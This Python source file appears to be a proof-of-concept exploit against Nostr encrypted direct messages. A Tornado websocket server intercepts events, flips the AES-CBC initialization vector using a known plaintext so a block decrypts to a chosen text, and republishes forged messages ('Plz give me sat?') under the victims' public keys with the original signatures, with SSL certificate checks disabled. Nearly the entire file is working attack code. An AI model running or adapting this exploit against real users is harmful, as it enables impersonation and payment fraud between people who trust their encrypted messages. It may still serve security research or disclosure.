import tornado.ioloop
import tornado.web
import tornado.websocket
import tornado.template
import json
import urllib.parse
import base64
from Crypto.Util.strxor import strxor
from Crypto.Util.Padding import pad
import sys,os
sys.path.append(os.path.join(os.path.dirname(__file__), './python-nostr/'))
from nostr.event import Event, EventKind
from nostr.relay_manager import RelayManager
import time, ssl

FIELD_LENGTH = 42 #len(b'{"id":"","method":"connect","params":[""]}')
KNOWN_PLAINTEXT = r'''{"id":"%s","method":"connect","params":["%s"]}'''

relay_manager = RelayManager()
relay_manager.add_relay("wss://relay.example.com")
relay_manager.open_connections({"cert_reqs": ssl.CERT_NONE}) # NOTE: This disables ssl certificate verification

server_client_list = []
'''
# paddingを考慮しないとならいので↓の実装は使えない．
def get_known_plaintext(event):
    parse = urllib.parse.urlparse(event['content'])
    ciphertext = base64.b64decode(parse.path)
    id_len = len(ciphertext)-(FIELD_LENGTH+len(event['pubkey']))
    known_plaintext = KNOWN_PLAINTEXT % ('0'*id_len,event['pubkey'])
    return known_plaintext.encode('utf-8')
'''

def get_known_plaintext(event, id_len):
    known_plaintext = KNOWN_PLAINTEXT % ('0'*id_len,event['pubkey'])
    return known_plaintext.encode('utf-8')

def forgery_dm_event_from_sender(event, msg_in_byte):
    if len(msg_in_byte)>16:
        return None
    if len(msg_in_byte)<16:
        msg_in_byte = pad(msg_in_byte, block_size=16)
    
    new_event_list = list()
    #const guessedPlaintext = `{"id":"0000000000000000","method":"connect","params":["${stoleEvent.pubkey}"]}`
    #known_plaintext = '":"connect","par'.encode('utf-8')
    known_plaintext = bytes.fromhex('223a22636f6e6e656374222c22706172') #":"connect","par (32:48)
    parse = urllib.parse.urlparse(event['content'])
    ciphertext = base64.b64decode(parse.path)
    iv = ciphertext[16:32]
    ciphertext = ciphertext[32:48]
    for id_len in range(16,17):
        known_plaintext = get_known_plaintext(event, id_len)[32:48]
        print('iv', len(iv))
        print('msg_in_byte', len(msg_in_byte))
        print('known_plaintext', len(known_plaintext))

        iv_ = strxor(strxor(iv, known_plaintext),msg_in_byte)
        ciphertext_ = base64.b64encode(ciphertext).decode('utf-8')+"?iv="+base64.b64encode(iv_).decode('utf-8')

        victim1_pubkey = event['pubkey']
        victim2_pubkey = event['tags'][0][1]
        
        new_event = Event(kind=EventKind.ENCRYPTED_DIRECT_MESSAGE, content=ciphertext_, public_key=victim1_pubkey, signature=event['sig'])
        new_event.add_pubkey_ref(victim2_pubkey)
        new_event_list.append(new_event)
    
    return new_event_list

def forgery_dm_event_from_recipient(event, msg_in_byte):
    if len(msg_in_byte)>16:
        return None
    if len(msg_in_byte)<16:
        msg_in_byte = pad(msg_in_byte, block_size=16)
    
    new_event_list = list()
    #const guessedPlaintext = `{"id":"0000000000000000","method":"connect","params":["${stoleEvent.pubkey}"]}`
    #known_plaintext = '":"connect","par'.encode('utf-8')
    known_plaintext = bytes.fromhex('223a22636f6e6e656374222c22706172') #":"connect","par (32:48)
    parse = urllib.parse.urlparse(event['content'])
    ciphertext = base64.b64decode(parse.path)
    iv = ciphertext[16:32]
    ciphertext = ciphertext[32:48]
    for id_len in range(16,17):
        known_plaintext = get_known_plaintext(event, id_len)[32:48]
        print('iv', len(iv))
        print('msg_in_byte', len(msg_in_byte))
        print('known_plaintext', len(known_plaintext))

        iv_ = strxor(strxor(iv, known_plaintext),msg_in_byte)
        ciphertext_ = base64.b64encode(ciphertext).decode('utf-8')+"?iv="+base64.b64encode(iv_).decode('utf-8')

        victim1_pubkey = event['pubkey']
        victim2_pubkey = event['tags'][0][1]
        
        new_event = Event(kind=EventKind.ENCRYPTED_DIRECT_MESSAGE, content=ciphertext_, public_key=victim2_pubkey, signature=event['sig'])
        new_event.add_pubkey_ref(victim1_pubkey)
        new_event_list.append(new_event)
    
    return new_event_list


class MyWebSocketHandlerMultiClient_Server(tornado.websocket.WebSocketHandler):
    def open(self):
        global server_client_list
        if self not in server_client_list:
            server_client_list.append(self)

    def on_message(self, message):
        global server_client_list
        msg = json.loads(message)
        if "EVENT"==msg[0]:
            print("event->kind:", msg[1]["kind"])
            if msg[1]["kind"]==24133:
                print("original event:")
                print(msg[1])
                print("------")
                print("change message into %s" % bytes.fromhex('6d616c6963696f75736d657373616765').decode('utf-8'))
                print("------")
                #sender_forgery_msg = b'Plz give me 1BTC'
                recipient_forgey_msg = b'Plz give me sat?'
                new_event_list = list() #forgery_dm_event_from_sender(msg[1], sender_forgery_msg)#forgery_dm_event(msg[1], bytes.fromhex('6d616c6963696f75736d657373616765')) #maliciousmessage
                new_event_list2 = forgery_dm_event_from_recipient(msg[1], recipient_forgey_msg)#forgery_dm_event(msg[1], bytes.fromhex('6d616c6963696f75736d657373616765')) #maliciousmessage
                print('modified messages:')
                print(new_event_list)
                time.sleep(1.25)
                print("----")
                for ev in new_event_list:
                    relay_manager.publish_event(ev)
                    print("sent Forged DM from Alice")
                    time.sleep(1) # allow the messages to send

                for ev in new_event_list2:
                    relay_manager.publish_event(ev)
                    print("sent Forged DM from Bob")
                    time.sleep(1) # allow the messages to send
                

    def on_close(self):
        global server_client_list
        if self in server_client_list:
            server_client_list.remove(self)

    def check_origin(self, origin):
        return True

if __name__ == '__main__':
    application = tornado.web.Application( \
        [('/',  \
          MyWebSocketHandlerMultiClient_Server)])
    application.listen(9000)
    tornado.ioloop.IOLoop.instance().start()
    
